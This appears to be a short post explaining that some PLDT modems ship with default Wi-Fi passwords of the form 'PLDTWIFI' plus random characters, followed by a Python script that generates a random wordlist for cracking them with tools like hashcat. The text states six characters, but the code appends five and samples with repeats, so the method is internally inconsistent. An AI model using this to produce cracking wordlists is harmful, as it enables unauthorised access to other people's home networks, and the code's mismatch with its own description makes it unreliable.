Explanation:

The default passwords of any(not all) PLDT Modems is PLDTWIFI****** <- 6 random characters and numbers combined... you can easily randomize them and produce your own .txt file like rockyou.txt, hashcat.txt and other password .txt available in the web.

##Here's the code:
#p.s you can choose any Cracking app-ish on linux...
```console
import random

# Define the prefix string
prefix = "PLDTWIFI"

# Define the characters that can be used in the random combinations
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Define the number of random combinations to generate
numCombinations = 999999

# Open a text file for writing
with open("output1.txt", "w") as file:
    # Loop through the number of combinations to generate and write each one to the file
    for i in range(numCombinations):
        combination = prefix
        
        # Generate a random string of 5 characters from the "characters" string
        for j in range(5):
            combination += random.choice(characters)
        
        # Write the combination to the file
        print(combination)
        file.write(combination + "\n")
...
```
